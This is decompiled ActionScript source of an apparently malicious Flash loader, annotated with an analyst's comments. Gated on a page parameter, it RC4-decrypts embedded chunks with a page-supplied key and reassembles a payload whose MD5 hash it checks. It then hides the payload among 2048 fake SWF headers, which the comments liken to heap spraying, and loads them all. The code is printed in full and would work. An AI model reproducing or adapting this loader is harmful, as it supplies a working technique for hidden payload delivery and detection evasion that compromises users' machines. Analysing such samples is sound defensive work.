package
{
   import flash.display.Sprite;
   import flash.utils.ByteArray;
   import package_1.class_2;
   import flash.utils.Endian;
   import flash.display.Loader;
   import flash.system.LoaderContext;
   import package_2.class_3;
   
   public final class class_1 extends Sprite
   {
       
      
      private var var_1:Array;
      
      private var var_4:ByteArray;
      
      private var loaderParamX:String;
      
      private var loaderParamY:String;
      
      public function class_1()
      {
         var _loc2_:Loader = null;
         var _loc3_:LoaderContext = null;
         var _loc4_:class_3 = null;
         var _loc5_:String = null;
         var _loc6_:ByteArray = null;
         var _loc7_:ByteArray = null;
         var _loc8_:ByteArray = null;
         var _loc9_:ByteArray = null;
         var _loc10_:ByteArray = null;
         var _loc11_:ByteArray = null;
         var _loc12_:ByteArray = null;
         var _loc13_:ByteArray = null;
         var _loc14_:ByteArray = null;
         var _loc15_:ByteArray = null;
         var _loc16_:ByteArray = null;
         var _loc17_:ByteArray = null;
         var _loc18_:ByteArray = null;
         var _loc19_:ByteArray = null;
         var _loc20_:ByteArray = null;
         var _loc21_:ByteArray = null;
         var _loc22_:ByteArray = null;
         var _loc23_:ByteArray = null;
         var _loc24_:ByteArray = null;
         var _loc25_:ByteArray = null;
         var _loc26_:ByteArray = null;
         var _loc27_:ByteArray = null;
         var _loc28_:ByteArray = null;
         var _loc29_:ByteArray = null;
         var _loc30_:ByteArray = null;
         var _loc31_:ByteArray = null;
         var _loc32_:ByteArray = null;
         var _loc33_:ByteArray = null;
         var _loc34_:ByteArray = null;
         var _loc35_:ByteArray = null;
         var _loc36_:ByteArray = null;
         var _loc37_:ByteArray = null;
         var _loc38_:ByteArray = null;
         var _loc39_:ByteArray = null;
         var _loc40_:ByteArray = null;
         var _loc41_:ByteArray = null;
         var _loc42_:ByteArray = null;
         var _loc43_:ByteArray = null;
         var _loc44_:ByteArray = null;
         var _loc45_:ByteArray = null;
         var _loc46_:ByteArray = null;
         var _loc47_:ByteArray = null;
         var _loc48_:ByteArray = null;
         var _loc49_:ByteArray = null;
         var _loc50_:ByteArray = null;
         var _loc51_:ByteArray = null;
         var _loc52_:ByteArray = null;
         var _loc53_:ByteArray = null;
         var _loc54_:ByteArray = null;
         var _loc55_:ByteArray = null;
         var _loc56_:ByteArray = null;
         var _loc57_:ByteArray = null;
         var _loc58_:uint = 0;
         var _loc59_:Array = null;
         super();
         var loaderParams:Object = this.root.loaderInfo.parameters;
         if(loaderParams.flare == "On")
         {
            aLoader = new Loader();
            loaderCtx = new LoaderContext(false,this.root.loaderInfo.applicationDomain,null);
            this.var_1 = new Array();
            this.var_4 = new ByteArray();
            this.loaderParamX = loaderParams.x;
            this.loaderParamY = loaderParams.y;
            _loc4_ = new class_3();
            targetHash = "600aa47f484cbd43ecd37de5cf111b10";
            _loc6_ = ByteArray(new _loc4_.var_44());
            this.var_1.push(_loc6_);
            _loc7_ = ByteArray(new _loc4_.var_38());
            this.var_1.push(_loc7_);
            _loc8_ = ByteArray(new _loc4_.var_35());
            this.var_1.push(_loc8_);
            _loc9_ = ByteArray(new _loc4_.var_10());
            this.var_1.push(_loc9_);
            _loc10_ = ByteArray(new _loc4_.var_46());
            this.var_1.push(_loc10_);
            _loc11_ = ByteArray(new _loc4_.var_8());
            this.var_1.push(_loc11_);
            _loc12_ = ByteArray(new _loc4_.var_33());
            this.var_1.push(_loc12_);
            _loc13_ = ByteArray(new _loc4_.var_50());
            this.var_1.push(_loc13_);
            _loc14_ = ByteArray(new _loc4_.var_21());
            this.var_1.push(_loc14_);
            _loc15_ = ByteArray(new _loc4_.var_24());
            this.var_1.push(_loc15_);
            _loc16_ = ByteArray(new _loc4_.var_47());
            this.var_1.push(_loc16_);
            _loc17_ = ByteArray(new _loc4_.var_45());
            this.var_1.push(_loc17_);
            _loc18_ = ByteArray(new _loc4_.var_51());
            this.var_1.push(_loc18_);
            _loc19_ = ByteArray(new _loc4_.var_22());
            this.var_1.push(_loc19_);
            _loc20_ = ByteArray(new _loc4_.var_7());
            this.var_1.push(_loc20_);
            _loc21_ = ByteArray(new _loc4_.var_16());
            this.var_1.push(_loc21_);
            _loc22_ = ByteArray(new _loc4_.var_53());
            this.var_1.push(_loc22_);
            _loc23_ = ByteArray(new _loc4_.var_12());
            this.var_1.push(_loc23_);
            _loc24_ = ByteArray(new _loc4_.var_41());
            this.var_1.push(_loc24_);
            _loc25_ = ByteArray(new _loc4_.var_26());
            this.var_1.push(_loc25_);
            _loc26_ = ByteArray(new _loc4_.var_31());
            this.var_1.push(_loc26_);
            _loc27_ = ByteArray(new _loc4_.var_15());
            this.var_1.push(_loc27_);
            _loc28_ = ByteArray(new _loc4_.var_58());
            this.var_1.push(_loc28_);
            _loc29_ = ByteArray(new _loc4_.var_37());
            this.var_1.push(_loc29_);
            _loc30_ = ByteArray(new _loc4_.var_54());
            this.var_1.push(_loc30_);
            _loc31_ = ByteArray(new _loc4_.var_48());
            this.var_1.push(_loc31_);
            _loc32_ = ByteArray(new _loc4_.var_36());
            this.var_1.push(_loc32_);
            _loc33_ = ByteArray(new _loc4_.var_30());
            this.var_1.push(_loc33_);
            _loc34_ = ByteArray(new _loc4_.var_28());
            this.var_1.push(_loc34_);
            _loc35_ = ByteArray(new _loc4_.var_14());
            this.var_1.push(_loc35_);
            _loc36_ = ByteArray(new _loc4_.var_11());
            this.var_1.push(_loc36_);
            _loc37_ = ByteArray(new _loc4_.var_18());
            this.var_1.push(_loc37_);
            _loc38_ = ByteArray(new _loc4_.var_55());
            this.var_1.push(_loc38_);
            _loc39_ = ByteArray(new _loc4_.var_43());
            this.var_1.push(_loc39_);
            _loc40_ = ByteArray(new _loc4_.var_52());
            this.var_1.push(_loc40_);
            _loc41_ = ByteArray(new _loc4_.var_17());
            this.var_1.push(_loc41_);
            _loc42_ = ByteArray(new _loc4_.var_42());
            this.var_1.push(_loc42_);
            _loc43_ = ByteArray(new _loc4_.var_49());
            this.var_1.push(_loc43_);
            _loc44_ = ByteArray(new _loc4_.var_40());
            this.var_1.push(_loc44_);
            _loc45_ = ByteArray(new _loc4_.var_29());
            this.var_1.push(_loc45_);
            _loc46_ = ByteArray(new _loc4_.var_32());
            this.var_1.push(_loc46_);
            _loc47_ = ByteArray(new _loc4_.var_13());
            this.var_1.push(_loc47_);
            _loc48_ = ByteArray(new _loc4_.var_27());
            this.var_1.push(_loc48_);
            _loc49_ = ByteArray(new _loc4_.var_19());
            this.var_1.push(_loc49_);
            _loc50_ = ByteArray(new _loc4_.var_23());
            this.var_1.push(_loc50_);
            _loc51_ = ByteArray(new _loc4_.var_20());
            this.var_1.push(_loc51_);
            _loc52_ = ByteArray(new _loc4_.var_6());
            this.var_1.push(_loc52_);
            _loc53_ = ByteArray(new _loc4_.var_57());
            this.var_1.push(_loc53_);
            _loc54_ = ByteArray(new _loc4_.var_56());
            this.var_1.push(_loc54_);
            _loc55_ = ByteArray(new _loc4_.var_9());
            this.var_1.push(_loc55_);
            _loc56_ = ByteArray(new _loc4_.var_34());
            _loc57_ = ByteArray(new _loc4_.var_25());
            i = 0;
            while(i < this.var_1.length)
            {
               this.var_1[i] = someRC4(this.var_1[i],this.loaderParamX);
               i++;
            }
            randomSWFs = new Array(2048);
            i = 0;
            while(i < randomSWFs.length) // this is similar to heap spraying
            {
               randomSWFs[i] = this.createRandomSWFHeader();
               i++;
            }
            this.decodeUsingParamY(); // result saved into var4
            if(class_2.callSomeMD5(this.var_4) == targetHash) // check hash is equal to target 600aa47f484cbd43ecd37de5cf111b10
            {
               randomSWFs[this.RandomNumBetween(0,randomSWFs.length - 1)] = this.var_4; // this.var4 is a valid SWF header? or rather its not a SWF header hiding in a sea of SWF headers
               this.mohawkDisturbanceMartini(randomSWFs); // swaps the swf headers around randomly
               i = 0;
               while(i < randomSWFs.length)
               {
                  aLoader.loadBytes(randomSWFs[i],loaderCtx); // loads all the fake swf
                  i++;
               }
            }
         }
      }
      
      public static function someRC4(param1:ByteArray, param2:String) : ByteArray {
         var _loc5_:* = undefined;
         var _loc3_:ByteArray = new ByteArray();
         var _loc4_:ByteArray = new ByteArray();
         _loc3_.writeBytes(param1,16,param1.length - 16);
         _loc4_.writeUTFBytes(param2);
         _loc4_.writeBytes(param1,0,16);
         _loc5_ = class_2.method_8(_loc4_); // sha1?
         var _loc6_:* = 0;
         var _loc7_:* = 0;
         var _loc8_:* = 0;
         var _loc9_:ByteArray = new ByteArray();
         var _loc10_:uint = 0;
         var _loc11_:ByteArray = new ByteArray();
         _loc7_ = uint(0);
         while(_loc7_ < 256)
         {
            _loc9_[_loc7_] = _loc7_;
            _loc7_++;
         }
         _loc7_ = uint(0);
         while(_loc7_ < 256)
         {
            _loc10_ = _loc10_ + _loc9_[_loc7_] + _loc5_.charCodeAt(_loc7_ % _loc5_.length) & 255;
            _loc6_ = uint(_loc9_[_loc7_]);
            _loc9_[_loc7_] = _loc9_[_loc10_];
            _loc9_[_loc10_] = _loc6_;
            _loc7_++;
         }
         _loc7_ = uint(0);
         _loc10_ = 0;
         _loc8_ = uint(0);
         while(_loc8_ < _loc3_.length)
         {
            _loc7_ = uint(_loc7_ + 1 & 255);
            _loc10_ = _loc10_ + _loc9_[_loc7_] & 255;
            _loc6_ = uint(_loc9_[_loc7_]);
            _loc9_[_loc7_] = _loc9_[_loc10_];
            _loc9_[_loc10_] = _loc6_;
            _loc11_[_loc8_] = _loc3_[_loc8_] ^ _loc9_[_loc9_[_loc7_] + _loc9_[_loc10_] & 255];
            _loc8_++;
         }
         return _loc11_;
      }
      
      public final function createRandomSWFHeader() : ByteArray { // creates SWF Header with random version and random file length
         var _loc1_:ByteArray = new ByteArray();
         var _loc2_:int = this.RandomNumBetween(50000,500000); // Math.random between the 2 params
         var _loc3_:int = this.RandomNumBetween(1,19);
         _loc1_.length = _loc2_;
         _loc1_.writeByte(70); // F
         _loc1_.writeByte(87); // W
         _loc1_.writeByte(83); // S
         _loc1_.writeByte(_loc3_); // some random version
         _loc1_.endian = Endian.LITTLE_ENDIAN;
         _loc1_.writeUnsignedInt(_loc2_);
         _loc1_.endian = Endian.BIG_ENDIAN;
         _loc1_.position = 0;
         return _loc1_;
      }
      
      public final function RandomNumBetween(param1:Number, param2:Number) : Number { // random number generator ranging from param1 to param2
         return Math.floor(Math.random() * (param2 - param1 + 1)) + param1;
      }
      
      public final function mohawkDisturbanceMartini(param1:Array) : Array { // jumble up the array randomly
         var _loc2_:Object = null;
         var _loc3_:uint = 0;
         var _loc4_:uint = 0;
         while(_loc4_ < param1.length)
         {
            _loc3_ = this.RandomNumBetween(0,param1.length - 1);
            _loc2_ = param1[_loc4_];
            param1[_loc4_] = param1[_loc3_];
            param1[_loc3_] = _loc2_;
            _loc4_++;
         }
         return param1;
      }
      
      public final function method_17(param1:Object) : *
      {
         var _loc2_:ByteArray = new ByteArray();
         _loc2_.writeObject(param1);
         _loc2_.position = 0;
         return _loc2_.readObject();
      }
      
      public final function decodeUsingParamY() : void { // (frighteningIntoxicant) decodes a message using paramY (in the form a:1,b:2,etc..)
         var _loc3_:Array = null;
         var _loc1_:Array = this.loaderParamY.split(","); // a:1,b:2,etc..
         var _loc2_:uint = 0;
         while(_loc2_ < _loc1_.length)
         {
            _loc3_ = _loc1_[_loc2_].split(":");
            this.var_4[_loc2_] = this.var_1[_loc3_[0]][_loc3_[1]]; // var4 grabs certain bytes from the huge decrypted chunk using var5 string
            _loc2_++;
         }
      }
   }
}
